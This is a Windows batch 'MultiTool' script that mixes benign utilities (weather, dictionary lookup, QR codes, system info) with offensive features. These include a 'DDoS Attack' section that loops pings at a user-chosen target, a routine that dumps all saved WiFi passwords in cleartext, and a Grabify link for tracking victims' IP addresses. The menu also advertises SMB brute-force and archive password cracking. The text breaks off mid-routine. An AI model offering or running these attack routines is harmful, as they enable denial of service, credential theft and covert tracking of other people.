@echo off
title MultiTool - by DrollerBike
chcp 65001 >nul
mode 120,30
cd files
if /I "%~1"=="isAdmin-netreport" goto :isAdmin-netreport
if "%~2"=="isAdmin-BSoD" goto :isAdmin-BSoD
:start
cls
call :banner

:menu
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
echo.
echo.
echo [38;2;255;255;0m        ╔═(1) Kill CMD                                                                        Network Info (9)═╗[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠══(2) Kill Powershell                                                                  Telehack (10)══╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠═══(3) Shutdown PC on a Network                                                      Dictonary (11)═══╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠════(4) Kill All Windows                                                             Gui_Test (12)════╣[0m 
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠═════(5) Show All Networks                                                      Qrcode Maker (13)═════╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m
echo [38;2;255;255;0m        ╠══════(6) Weather                                                             Shorten Links (14)══════╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠═══════(7) Geolocate                                                     Delete Temp files (15)═══════╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠════════(8) DDosAttack                                                              About (16)════════╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╚╦════════(0) Exit                                                                 Page 2 (P2)════════╦╝[0m  
echo [38;2;255;255;0m         ╚══════════════════════════════════════════════════╦═════════════════════════════════════════════════╝[0m  
set /p input=.%BS% [38;2;255;255;0m                                                           ╚══════^>[0m  
if /I %input% EQU 1 start kill_cmd.lnk
if /I %input% EQU 2 start kill_powershell.lnk
if /I %input% EQU 3 goto net_shut
if /I %input% EQU 4 goto kill_windows
if /I %input% EQU 5 goto show_networks
if /I %input% EQU 6 goto weather
if /I %input% EQU 7 goto geolocate
if /I %input% EQU 8 goto DDosAttack
if /I %input% EQU 0 exit
if /I %input% EQU 9 goto network_info
if /I %input% EQU 10 goto Telehack
if /I %input% EQU 11 goto Dictonary
if /I %input% EQU 12 goto Gui_Test
if /I %input% EQU 13 goto Qrcode_Maker
if /I %input% EQU 14 goto Shorten_Links
if /I %input% EQU 15 goto Delete_temp
if /I %input% EQU 16 goto about-dbgmultitool
if /I %input% EQU 17 goto System_info
if /I %input% EQU 18 goto Diagnostic
if /I %input% EQU 19 goto Computer_Power
if /I %input% EQU 20 goto remote_destop
if /I %input% EQU 21 goto WinRAR_Cracker
if /I %input% EQU 22 goto Registry
if /I %input% EQU 23 goto SMB_Brute
if /I %input% EQU 24 goto Custom_CMD
if /I %input% EQU 25 goto IP-call-puller
if /I %input% EQU 26 goto ankush
if /I %input% EQU 27 goto backup-files
if /I %input% EQU 28 goto large-files
if /I %input% EQU 29 goto disk-space
if /I %input% EQU 30 goto youtube-video
if /I %input% EQU 31 goto software-removal
if /I %input% EQU 32 goto Colors
if /I %input% EQU 33 goto network__report
if /I %input% EQU 34 goto screen-steps-recorder
if /I %input% EQU 35 goto Fake-Blue-Screen
if /I %input% EQU 36 goto Fake-Update-Screen
if /I %input% EQU 37 goto obfuscator
if /I %input% EQU 38 goto notepad-CMD
if /I %input% EQU 39 goto windows-system-Info
if /I %input% EQU 40 goto remote-assistance
if /I %input% EQU 41 goto sudo
if /I %input% EQU 42 goto system-properties
if /I %input% EQU 43 goto create-share-folder
if /I %input% EQU 44 goto sdclt
if /I %input% EQU 45 goto presentation-settings
if /I %input% EQU 46 goto resource-monitor
if /I %input% EQU 47 goto user-account
if /I %input% EQU 48 goto nslookup
if /I %input% EQU P2 goto page-2
if /I %input% EQU p2 goto page-2
if /I %input% EQU P3 goto page-3
if /I %input% EQU p3 goto page-3
if /I %input% EQU restart goto start
if /I %input% EQU Restart goto start
if /I %input% EQU RESTART goto start
if /I %input% EQU crash-me goto crasher
if /I %input% EQU advance-restart goto advance-restart
if /I %input% EQU Advance-Restart goto advance-restart
if /I %input% EQU AR goto advance-restart
if /I %input% EQU ar goto advance-restart
if /I %input% EQU kitty goto kitty-curl
if /I %input% EQU rick goto rick-curl
if /I %input% EQU run-man goto runman-curl
if /I %input% EQU star-wars goto starwars-curl
if /I %input% EQU Clock goto Clock
if /I %input% EQU clock goto Clock
if /I %input% EQU KYS exit
if /I %input% EQU kys exit
if /I %input% EQU echo-Hello-World! goto Hello-World!
if /I %input% EQU print("Hello-World!") goto Hello-World!
if /I %input% EQU Hello-World goto Hello-World!
if /I %input% EQU BIOS goto BIOS-menu
if /I %input% EQU Basic-Input/Output-System goto BIOS-menu
if /I %input% EQU fuck-you goto fuck-you
if /I %input% EQU fuck goto fuck-you
if /I %input% EQU blue-screen goto Blue-Screen
cls
goto start


:net_shut
cls
arp -a
shutdown /i
pause
goto start

:kill_windows
cls
powershell -command "(New-Object -comObject Shell.Application).Windows() | foreach-object {$_.quit()}; Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | stop-process"
pause
goto start

:show_networks
cls
netsh wlan show profiles
echo.
pause
echo.

echo Fetching all saved WiFi passwords...
echo ----------------------------------------
for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr /C:"All User Profile"') do (
    setlocal enabledelayedexpansion
    set "ssid=%%A"
    set "ssid=!ssid:~1!"
    echo [Network: !ssid!]
    netsh wlan show profile name="!ssid!" key=clear | findstr /C:"Key Content"
    echo ----------------------------------------
    endlocal
)

pause
goto start

:weather
cls
set /p city="Enter your city name: "
curl wttr.in/%city%
pause
goto start

:geolocate
cls
echo.
set /p ip=IP Address (Press Enter to get your Public IP Adress.): 
cls
setlocal ENABLEDELAYEDEXPANSION
set webclient=webclient
if exist "%temp%\%webclient%.vbs" del "%temp%\%webclient%.vbs" /f /q /s >nul
if exist "%temp%\response.txt" del "%temp%\response.txt" /f /q /s >nul
:iplookup
echo sUrl = "http://ipinfo.io/%ip%/json" > %temp%\%webclient%.vbs
:localip
cls
echo set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0") >> %temp%\%webclient%.vbs
echo oHTTP.open "GET", sUrl,false >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded" >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Length", Len(sRequest) >> %temp%\%webclient%.vbs
echo oHTTP.send sRequest >> %temp%\%webclient%.vbs
echo HTTPGET = oHTTP.responseText >> %temp%\%webclient%.vbs
echo strDirectory = "%temp%\response.txt" >> %temp%\%webclient%.vbs
echo set objFSO = CreateObject("Scripting.FileSystemObject") >> %temp%\%webclient%.vbs
echo set objFile = objFSO.CreateTextFile(strDirectory) >> %temp%\%webclient%.vbs
echo objFile.Write(HTTPGET) >> %temp%\%webclient%.vbs
echo objFile.Close >> %temp%\%webclient%.vbs
echo Wscript.Quit >> %temp%\%webclient%.vbs
start %temp%\%webclient%.vbs
set /a requests=0
:checkresponseexists
set /a requests=%requests% + 1
if %requests% gtr 7 goto failed
IF EXIST "%temp%\response.txt" (
goto response_exist
) ELSE (
ping 127.0.0.1 -n 2 -w 1000 >nul
goto checkresponseexists
)
:failed
taskkill /f /im wscript.exe >nul
del "%temp%\%webclient%.vbs" /f /q /s >nul
echo.
echo Did not receive a response from the API.
echo.
pause
goto start
:response_exist
cls
echo.
for /f "delims=     " %%i in ('findstr /i "," %temp%\response.txt') do (
    set data=%%i
    set data=!data:,=!
    set data=!data:""=Not Listed!
    set data=!data:"=!
    set data=!data:ip:=IP:      !
    set data=!data:hostname:=Hostname:  !
    set data=!data:org:=ISP:        !
    set data=!data:city:=City:      !
    set data=!data:region:=State:   !
    set data=!data:country:=Country:    !
    set data=!data:postal:=Postal:  !
    set data=!data:loc:=Location:   !
    set data=!data:timezone:=Timezone:  !
    echo !data!
)
echo.
del "%temp%\%webclient%.vbs" /f /q /s >nul
del "%temp%\response.txt" /f /q /s >nul
if '%ip%'=='' goto menu
pause
goto start

:DDosAttack
cls
echo.
echo [40;32mWindows DDoS Attack tools
echo [40;32mCopyright ([40;37mC[40;32m) InCode, inc. All right reserved.
:login
echo.
echo [40;32mEnter your name and password "hack"
echo.
set /p name=[40;32mInput Your Name:[40;33m
set /p pass=[40;32mInput Password:[40;33m

if %pass%==hack (
    goto NEXTY
    ) else (
        goto wrong_password
    )
pause

echo.
:wrong_password 
echo [40;31mThe Password is Wrong!
goto login

:NEXTY
echo [40;32mOk [40;33m%name%, [40;32mWelcome to tools DDoS Attack
echo.
echo Press enter to continue . . . 
pause>nul
cls
echo.
echo.
echo [40;32m------------------------------ [40;34mREMEMBER, DON'T DO IT FOR ILLEGAL THINGS [40;32m---------------------------
echo.
echo.
echo.
echo                    `                      
echo [40;34m                      +.`/`                 
echo [40;34m                .   `  yo-h:                    [DDoS[40;37m@[40;34mattack]
echo [40;34m          /+/omhomh+-smohh-                     [40;32m--------------------
echo [40;34m       :+oyNNNNNNNNNNNNNdmNy-                   [*][40;37mAuthor : ~ R.Code
echo [40;34m      `+mNNNmy++//+shmNNNNNNNh:                 [*][40;37mType : DDoS Attack         
echo [40;34m     -yNNNd:         `:ymNNNNmmh.               [*][40;37mTeam : InCode Team
echo [40;34m     :mNNN-             .sNNNmsdd-              [*][40;37mOperating System : %os%
echo [40;34m    `/hNNN`               :dNNNNNm-             [*][40;37mPC Name : %computername%
echo [40;34m      `mmNNy`                -odNNNo`           [*][40;37mUsername : %username%
echo [40;34m      `.:NNNd/                  :hNNmo-         [*][40;37mDate : %date%
echo [40;34m         o/ymNdo.                 oNNm:         [40;32m--------------------
echo [40;34m            `/ymNds:`             :h+.          [use this tool well]
echo [40;34m                -+sdNds/`                       [-][40;37mInfo Author :
echo [40;34m                    `:odmy:                     [+][40;37mContact : +62 821-7493-5446  
echo [40;34m                        .+dh.                   [+][40;37mEmail : rcode360@gmail.com
echo [40;34m                           /d-                  
echo [40;34m                            .h                    [41;37m  [46;37m  [43;37m  [44;37m  [45;37m  [44;37m  [47;37m  
echo [40;34m                             :            	[46;37m  [41;37m  [46;37m  [43;37m  [44;37m  [45;37m  [44;37m  [47;37m  
echo.
echo [40;32m__________________________________________________________________________________________________
echo [40;34m/ ____\ \   / /  _ \:  ____:  __ \   / ____:  ____/ ____: :  : :  __ \:_   _:__   __\ \   / /     /
echo [40;34m: :     \ \_/ /: :_) : :__  : :__) : : (___ : :__ : :    : :  : : :__) : : :    : :   \ \_/ /    /
echo [40;34m: :____   : :  : :_) : :____: : \ \   ____) : :___: :____: :__: : : \ \ _: :_   : :     : :     /
echo [40;34m\_____:  :_:  :____/:______:_:  \_\ :_____/:______\_____:\____/:_:  \_\_____:  :_:     :_:     /
echo. 
echo.                                                                                             
pause>nul 
goto NEXT

:NEXT     
echo Choice :
echo.
echo [40;32m----------------------------
echo [40;34m[1] [40;37mCheck Target Connection
echo [40;34m[2] [40;37mContinue Attack
echo [40;34m[3] [40;37mTracking IP by sending link
echo [40;34m[4] [40;37mZenmap / Nmap Download 
echo [40;34m[5] [40;37mNSLookup Target
echo [40;32m----------------------------
echo [40;34m[6] [40;37mDownload Kali Linux Virtual Box
echo [40;34m[7] [40;37mDownload Wireshark
echo [40;34m[8] [40;37mDownload Virtual Box
echo [40;32m----------------------------
echo [40;34m[0] [40;37mExit
echo [40;34m[Note] : [40;37mTo stop the attack press CTRL + C
set/p "input=Input Option:"
echo.
if %input%==1 goto check_connection
if %input%==2 goto continue
if %input%==3 start https://www.grabify.link
if %input%==4 goto nmap
if %input%==5 goto nslookup
if %input%==6 goto kali
if %input%==7 goto wireshark
if %input%==8 goto vb
if %input%==0 goto out

echo.

:check_connection
echo [40;34m[==================================]
echo [40;34m[[40;32m--------- [40;37mHost Target : [40;32m----------[40;34m]
echo [40;34m[==================================]
echo.
set /p x=[40;37mHost Target:
ping %x% -n 1 >nul
if errorlevel 1 (
    echo [40;31mTarget is Offline
    ping localhost -n 1 >nul 
    echo [40;31mTarget is Offline
    ping localhost -n 1 >nul 
    echo [40;31mTarget is Offline
    ping %x% -n 2
) else (
    echo [40;32mTarget is Online
    ping localhost -n 1 >nul 
    echo [40;32mTarget is Online
    ping localhost -n 1 >nul 
    echo [40;32mTarget is Online
    ping %x% -n 1
)

goto continue

:out
set /p confirmation1=Are you sure you want to exit this program (Y/N) ?
if %confirmation1%==y goto start-DDOS
if %confirmation1%==n goto :NEXT
msg * Good By :)

:nslookup
:NSLOOKUP
SET TYPE=MX
echo [40;34m[==================================]
echo [40;34m[[40;32m--------- [40;37mHost Target : [40;32m----------[40;34m]
echo [40;34m[==================================]
echo.
set /p lookup=[40;37mIP Address / Website to lookup: 
nslookup %lookup%
pause
goto NEXT

:kali
start https://www.kali.org/get-kali/#kali-virtual-machines
pause
goto NEXT

:wireshark
start https://www.wireshark.org/download.html
pause
goto NEXT

:vb
start https://www.virtualbox.org/wiki/Downloads
pause
goto NEXT

:continue
echo [40;34m[==================================]
echo [40;34m[[40;32m---- [40;37mInput IP / Host Target : [40;32m----[40;34m]
echo [40;34m[==================================]
echo.
set /p m=[40;37mip Host:
echo.
echo [40;34m[==================================]
echo [40;34m[[40;32m---------- [40;37mInput Port : [40;32m----------[40;34m]
echo [40;34m[==================================]
echo.
set /p p=[40;37mport:
echo.
echo.
echo [40;34m[==========================================================]
echo [40;34m[[40;32m-- [40;37mEnter Packet / Packet Size to attack %m% : [40;32m--[40;34m]
echo [40;34m[==========================================================]
echo.
set /p n=[40;37mPacket Size:
echo.
:confirmation
set /p confirmation=[40;32mAre you sure you want to continue [40;34m([40;32mY[40;34m/[40;32mN[40;34m) [40;32m?
:scan
echo S
ping localhost -n 1 >nul
cls
echo Sc
ping localhost -n 1 >nul
cls
echo Sca
ping localhost -n 1 >nul
cls
echo Scan
ping localhost -n 1 >nul
cls
echo Scann
ping localhost -n 1 >nul
cls
echo Scanni
ping localhost -n 1 >nul
cls
echo Scannin 
ping localhost -n 1 >nul
cls
echo Scanning 
ping localhost -n 1 >nul
cls
echo Scanning S
ping localhost -n 1 >nul
cls
echo Scanning Se
ping localhost -n 1 >nul
cls
echo Scanning Ser
ping localhost -n 1 >nul
cls
echo Scanning Serv
ping localhost -n 1 >nul
cls
echo Scanning Serve
ping localhost -n 1 >nul
cls
echo Scanning Server
ping localhost -n 1 >nul
cls
echo Scanning Server.
ping localhost -n 1 >nul
cls
echo Scanning Server..
ping localhost -n 1 >nul
cls
echo Scanning Server...
ping localhost -n 1 >nul
cls
echo Scanning Server....
ping localhost -n 2 >nul
cls
echo Scanning Server...
ping localhost -n 1 >nul
cls
echo Scanning Server..
ping localhost -n 1 >nul
cls
echo Scanning Server.
ping localhost -n 1 >nul
cls
echo Scanning Server
ping localhost -n 1 >nul
cls
echo Scanning Serve
ping localhost -n 1 >nul
cls
echo Scanning Serv
ping localhost -n 1 >nul
cls
echo Scanning Ser
ping localhost -n 1 >nul
cls
echo Scanning Se
ping localhost -n 1 >nul
cls
echo Scanning S
ping localhost -n 1 >nul
cls
echo Scanning 
ping localhost -n 1 >nul
cls
echo Scanning
ping localhost -n 1 >nul
cls
echo Scannin
ping localhost -n 1 >nul
cls
echo Scanni
ping localhost -n 1 >nul
cls
echo Scann
ping localhost -n 1 >nul
cls
echo Scan
ping localhost -n 1 >nul
cls
echo Sca
ping localhost -n 1 >nul
cls
echo Sc
ping localhost -n 1 >nul
cls
echo S
ping localhost -n 1 >nul
cls
if %confirmation%==y goto :DDOS
if %confirmation%==n goto :NEXT
 
:nmap
cls
echo install nmap
powershell -Command "Invoke-WebRequest https://nmap.org/dist/nmap-7.80-setup.exe -OutFile nmap-7.80-setup.exe"
start nmap-7.80-setup.exe
echo type nmap to use
pause
goto start-DDOS

:start-DDOS
exit

:DDOS
@REM ping -n 1 %m% -l %n% | FIND "TTL="
@REM IF ERRORLEVEL 1 (SET in=c & echo No connection, server maybe down.)
@REM color %in%
@REM ping -t 2 0 10 127.0.0.1 >nul
ping %m% -l %n% -n 1 >nul
if errorlevel 1 (
    echo [40;31mNo Connection, Server maybe down
) else (
   echo [40;32m[%date%] [%time%] Attacking Server %m% {sent %n%}           [40;34m{--sent %n% #success--}
)
goto DDOS

:network_info
color a
mode 38,20
title Network Stats
echo Loading Network Information...
:loop
for /f "tokens=2 delims=:" %%a in ('netsh wlan show interface ^| find "SSID" ^| findstr /v "BSSID"') do set ssid=%%a
for /f "tokens=2 delims=:" %%a in ('netsh wlan show interface ^| find "Description"') do set adapter=%%a
for /f "tokens=2 delims=:" %%a in ('netsh wlan show interface ^| find "State"') do set state=%%a
for /f "tokens=2 delims=:" %%a in ('netsh wlan show interface ^| find "Signal"') do set signal=%%a
ping -n 3 8.8.8.8>%temp%\ping.txt
for /f "tokens=4 delims==" %%a in ('type %temp%\ping.txt ^| find "Average"') do set ping=%%a
for /f "tokens=4 delims= " %%a in ('type %temp%\ping.txt ^| find "Lost"') do set ploss=%%a
for /f "tokens=2 delims " %%a in ('netstat -e ^| find "Bytes"') do set rbytes=%%a
for /f "tokens=3 delims " %%a in ('netstat -e ^| find "Bytes"') do set sbytes=%%a
cls
echo  Network:
echo  --------
echo  SSID:%ssid%
echo  NIC:%adapter%
echo  State: %state%
echo  Signal:%signal%
echo.
echo  Network Speed:
echo  --------
echo  Ping:%ping%
echo  Packet Loss: %ploss%
echo  Received: %rbytes% BYtes
echo  Sent: %sbytes% Bytes
pause
goto start

:Telehack
cls
telnet telehack.com
pause
goto start

:Dictonary
cls
set /p word="Enter your word to define here: "
curl dict.org/d:%word%
pause
goto start

:Gui_Test
cls
echo.
echo 1) Notification
echo 2) Message Box
echo 3) Message Box with Buttons
echo 4) Input Box
echo 5) Window
echo 6) Custom GUI Test
set /p input=">>"
if %input% EQU 1 goto noti
if %input% EQU 2 goto msgbox
if %input% EQU 3 goto buttons
if %input% EQU 4 goto inputbox
if %input% EQU 5 goto window
if %input% EQU 6 goto customgui

:customgui
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; $mainForm = New-Object System.Windows.Forms.Form; $mainForm.Text = 'Main Window'; $lbl = New-Object System.Windows.Forms.Label; $lbl.Text = 'Hello World'; $mainForm.Controls.Add($lbl); $mainForm.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen; $mainForm.ShowDialog()}"
cls 
goto start

:window
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; $mainForm = New-Object System.Windows.Forms.Form; $mainForm.Text = 'Main Window'; $lbl = New-Object System.Windows.Forms.Label; $lbl.Text = 'Hello World'; $mainForm.Controls.Add($lbl); $mainForm.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen;$mainForm.ShowDialog()}"
cls
goto start

:inputbox
cls
powershell -Command "& {Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::InputBox('Enter your name:', 'Input box example')}" > %TEMP%\out.tmp
set /p OUT=<%TEMP%\out.tmp
set msgBoxArgs="& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('You have entered: %OUT%', 'Hello');}"
powershell -Command %msgBoxArgs%
cls
goto start

:buttons
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Hello', 'Hey', 'YesNo', [System.Windows.Forms.MessageBoxIcon]::Warning);}" > %TEMP%\out.tmp
set /p OUT=<%TEMP%\out.tmp
if %OUT%==Yes (echo Clicked Yes)
cls
goto start

:msgbox
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Hello World', 'This is an example', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information);}"
cls
goto start

:noti
cls
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Hello world', 'This is called from a batch script.', [System.Windows.Forms.ToolTipIcon]::None)}"
cls
goto start

:Qrcode_Maker
cls
set /p link="Enter your website link: "
curl qrenco.de/%link%
pause
goto start

:Shorten_Links
cls
set /p link="Enter your shorten link: "
curl --head --location "%link%" | findstr Location
pause
goto start

:Delete_temp
cls
del /q /F /s %temp%\*
pause
del /s /q C:\Windows\temp\*
pause
goto start

:about-dbgmultitool
cls
call :banner
echo.
echo.
echo 1) MultiTool Info
echo 2) Program Details
echo 3) Return to Menu
echo.
echo.
set "CHOICE="
set /p CHOICE="Enter 1, 2, or 3: "

if "%CHOICE%"=="1" (
    cls
    call :banner
    echo.
    echo.
    echo [4mType[0m         [4mDescription[0m
	echo.
	echo Name         DBG MultiTool
	echo.
    echo File Type    Batch ^(.bat^)
    echo.
    echo.
    pause
    goto about-dbgmultitool
) else if "%CHOICE%"=="2" (
    cls
    call :banner
    echo.
    echo.
    echo     [4mNumber[0m            [4mName[0m                        [4mDescription[0m
	echo.
    echo     ^(1^)               Kill CMD                    It will open up admin UAC and quit all CMDs or terminals.
	echo.
	echo     ^(2^)               Kill Powershell             It will open up admin UAC and quit all Powershell.
	echo.
	echo     ^(3^)               Shutdown PC on a Network    It will [30mError Can't show this %USERNAME% on %COMPUTERNAME%[0m
	echo.
	echo     ^(4^)               Kill All Windows            It will open up admin UAC and quit all apps and programs.
	echo.
	echo     ^(5^)               Show All Networks           It will show all networks names then the passwords.
	echo.
	echo     ^(6^)               Weather                     It will show the weather depending on your location.
	echo.
	echo     ^(7^)               Geolocate                   It will show details about the entered public IP Address.
	echo.
	echo     ^(8^)               DDosAttack                  It will [30mError Can't show this %USERNAME% on %COMPUTERNAME%[0m
	echo.
	echo     ^(9^)               Network Info                It will show details your network.
	echo.
	echo     ^(10^)               Telehack                   It will show the different things you can do with telenet.
	echo.
	echo     ^(11^)               Dictonary                  It will define a word.
	echo.
    echo     Go on to page 2
	pause
	cls
	call :banner
	echo.
	echo.
	echo     [4mNumber[0m            [4mName[0m                        [4mDescription[0m
	echo.
    echo     ^(12^)               Gui Test                    It will test the different popup boxes.
	echo.
	echo     ^(13^)               Qrcode Maker                It will make a qrcode for your specific website.
	echo.
	echo     ^(14^)               Shorten Links               It will find out what the shorten link will take you to.
	echo.
	echo     ^(15^)               Delete Temp Files           It will delete files in your temp folder.
	echo.
	echo     ^(16^)               About                       It will tell you Info about this MultiTool.
	echo.
	echo     ^(17^)               System Info                 It will tell you Info about your Computer.
	echo.
	echo     ^(18^)               Diagnostic                  It will tell you Diagnostic about your Computer.
	echo.
	echo     ^(19^)               Computer Power              It will give you options to Power Off your Computer.
	echo.
	echo     ^(20^)               Remote Desktop Connection   It will let you Connect to other Computers.
	echo.
	echo     ^(21^)               WinRAR Cracker              It will try and guess the password to your .rar file.
	echo.
	echo     ^(22^)               Registry Backup / Restore   It will Backup or Restore your Registry files.
	echo.
    echo.
    pause
    goto about-dbgmultitool
) else if "%CHOICE%"=="3" (
    goto start
) else (
    cls
    echo Invalid choice, please try again.
    timeout /t 2 >nul
    goto about-dbgmultitool
)

:page-2
cls
title MultiTool - by DrollerBike
call :banner

:menu2
echo.
echo.
echo [38;2;255;255;0m        ╔═(17) System_info                                                                 IP Call Puller (25)═╗[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠══(18) Diagnostic                                                                    Calculater (26)══╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠═══(19) Computer Power                                                            Backup Files (27)═══╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠════(20) Remote Desktop Connection                                              Largest Files (28)════╣[0m 
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠═════(21) WinRAR Cracker                                                          Disk Space (29)═════╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m
echo [38;2;255;255;0m        ╠══════(22) Registry Backup / Restore                                                Youtube (30)══════╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠═══════(23) SMB Bruteforce                                      Malicious Software Removal (31)═══════╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠════════(24) Custom CMD                                                       Colors Test (32)════════╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╚╦════════(P1) Page 1                                                              Page 3 (P3)════════╦╝[0m  
echo [38;2;255;255;0m         ╚══════════════════════════════════════════════════╦═════════════════════════════════════════════════╝[0m  
set /p input=.%BS% [38;2;255;255;0m                                                           ╚══════^>[0m  
if /I %input% EQU 1 start kill_cmd.lnk
if /I %input% EQU 2 start kill_powershell.lnk
if /I %input% EQU 3 goto net_shut
if /I %input% EQU 4 goto kill_windows
if /I %input% EQU 5 goto show_networks
if /I %input% EQU 6 goto weather
if /I %input% EQU 7 goto geolocate
if /I %input% EQU 8 goto DDosAttack
if /I %input% EQU 0 exit
if /I %input% EQU 9 goto network_info
if /I %input% EQU 10 goto Telehack
if /I %input% EQU 11 goto Dictonary
if /I %input% EQU 12 goto Gui_Test
if /I %input% EQU 13 goto Qrcode_Maker
if /I %input% EQU 14 goto Shorten_Links
if /I %input% EQU 15 goto Delete_temp
if /I %input% EQU 16 goto about-dbgmultitool
if /I %input% EQU 17 goto System_info
if /I %input% EQU 18 goto Diagnostic
if /I %input% EQU 19 goto Computer_Power
if /I %input% EQU 20 goto remote_destop
if /I %input% EQU 21 goto WinRAR_Cracker
if /I %input% EQU 22 goto Registry
if /I %input% EQU 23 goto SMB_Brute
if /I %input% EQU 24 goto Custom_CMD
if /I %input% EQU 25 goto IP-call-puller
if /I %input% EQU 26 goto ankush
if /I %input% EQU 27 goto backup-files
if /I %input% EQU 28 goto large-files
if /I %input% EQU 29 goto disk-space
if /I %input% EQU 30 goto youtube-video
if /I %input% EQU 31 goto software-removal
if /I %input% EQU 32 goto Colors
if /I %input% EQU 33 goto network__report
if /I %input% EQU 34 goto screen-steps-recorder
if /I %input% EQU 35 goto Fake-Blue-Screen
if /I %input% EQU 36 goto Fake-Update-Screen
if /I %input% EQU 37 goto obfuscator
if /I %input% EQU 38 goto notepad-CMD
if /I %input% EQU 39 goto windows-system-Info
if /I %input% EQU 40 goto remote-assistance
if /I %input% EQU 41 goto sudo
if /I %input% EQU 42 goto system-properties
if /I %input% EQU 43 goto create-share-folder
if /I %input% EQU 44 goto sdclt
if /I %input% EQU 45 goto presentation-settings
if /I %input% EQU 46 goto resource-monitor
if /I %input% EQU 47 goto user-account
if /I %input% EQU 48 goto nslookup
if /I %input% EQU P1 goto start
if /I %input% EQU p1 goto start
if /I %input% EQU P3 goto page-3
if /I %input% EQU p3 goto page-3
if /I %input% EQU restart goto start
if /I %input% EQU Restart goto start
if /I %input% EQU RESTART goto start
if /I %input% EQU crash-me goto crasher
if /I %input% EQU advance-restart goto advance-restart
if /I %input% EQU Advance-Restart goto advance-restart
if /I %input% EQU AR goto advance-restart
if /I %input% EQU ar goto advance-restart
if /I %input% EQU kitty goto kitty-curl
if /I %input% EQU rick goto rick-curl
if /I %input% EQU run-man goto runman-curl
if /I %input% EQU star-wars goto starwars-curl
if /I %input% EQU Clock goto Clock
if /I %input% EQU clock goto Clock
if /I %input% EQU KYS exit
if /I %input% EQU kys exit
if /I %input% EQU echo-Hello-World! goto Hello-World!
if /I %input% EQU print("Hello-World!") goto Hello-World!
if /I %input% EQU Hello-World goto Hello-World!
if /I %input% EQU BIOS goto BIOS-menu
if /I %input% EQU Basic-Input/Output-System goto BIOS-menu
if /I %input% EQU fuck-you goto fuck-you
if /I %input% EQU fuck goto fuck-you
if /I %input% EQU blue-screen goto Blue-Screen
cls
goto page-2


:System_info
cls
clssetlocal
set OUTPUT=
set /p SAVE="Save output to a file? (y/N): "
if /I "%SAVE%"=="y" (
  set TIMESTAMP=%date:~-4%%date:~4,2%%date:~7,2%_%time:~0,2%%time:~3,2%%time:~6,2%
  set OUTPUT=%~dp0sysinfo_%TIMESTAMP%.txt
  echo Saving to %OUTPUT%
)

echo ============================
echo System information for %COMPUTERNAME% - %USERNAME%
echo Collected: %date% %time%
echo ============================

(
echo Hostname: %COMPUTERNAME%
echo User: %USERNAME%
echo.
echo --- OS ---
ver
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Original Install Date"
echo.
echo --- Uptime (systeminfo) ---
systeminfo | findstr /C:"System Boot Time" /C:"System Up Time" || echo "Uptime not available via systeminfo on older systems"
echo.
echo --- CPU ---
wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors /format:list 2>nul
echo.
echo --- Memory ---
wmic OS get FreePhysicalMemory,TotalVisibleMemorySize /format:list 2>nul
echo.
echo --- Drives (free/size) ---
wmic logicaldisk get name,filesystem,freespace,size 2>nul
echo.
echo --- IP Configuration ---
ipconfig /all
echo.
echo --- Network routes ---
route print
echo.
echo --- Listening ports / open connections (netstat -ano) ---
netstat -ano
echo.
echo --- Installed Programs (partial) ---
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /v DisplayName 2>nul | findstr /I "DisplayName" || echo "(uninstall list unavailable)"
echo.
echo --- Services (running) ---
sc query state= running
echo.
echo --- Running Processes (tasklist) ---
tasklist
echo.
) > "%OUTPUT%" 2>&1

if "%OUTPUT%"=="" (
  rem print to console instead
  echo (printed above) & pause
) else (
  type "%OUTPUT%"
  echo.
